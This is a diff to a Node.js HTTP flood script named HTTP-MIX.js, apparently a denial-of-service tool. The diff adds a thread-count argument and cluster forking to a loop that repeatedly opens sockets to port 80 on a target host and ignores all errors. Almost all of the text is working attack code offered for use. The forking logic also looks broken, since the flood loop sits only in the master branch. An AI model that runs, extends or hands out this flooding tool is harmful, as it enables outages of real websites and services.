@@ -1,14 +1,15 @@
 const fs = require('fs');
 const url = require('url');
 const net = require('net');
+const cluster = require('cluster');
 if (process.argv.length <= 2) {
-    console.log("[HTTP-MIX.js]   |   [@nxt]");
-    console.log("node HTTP-MIX.js [Target URL] [Time]");
+    console.log("node mix.js url time threads");
     process.exit(-1);
 }
 var target = process.argv[2];
 var parsed = url.parse(target);
 var host = url.parse(target).host;
+var threads =process.argv[4];
 var time = process.argv[3];
 
 process.on('uncaughtException', function (e) { });
@@ -415,6 +416,11 @@ const nullHexs = [
 "\x78"
 ];
 
+if (cluster.isMaster) {
+    for(let i = 0; i < threads; i++) {
+        cluster.fork();
+    }
+
 var int = setInterval(() => {
     var s = require('net').Socket();
     s.connect(80, host);
@@ -437,3 +443,4 @@ var int = setInterval(() => {
     })
 });
 setTimeout(() => clearInterval(int), time * 1000);
+}
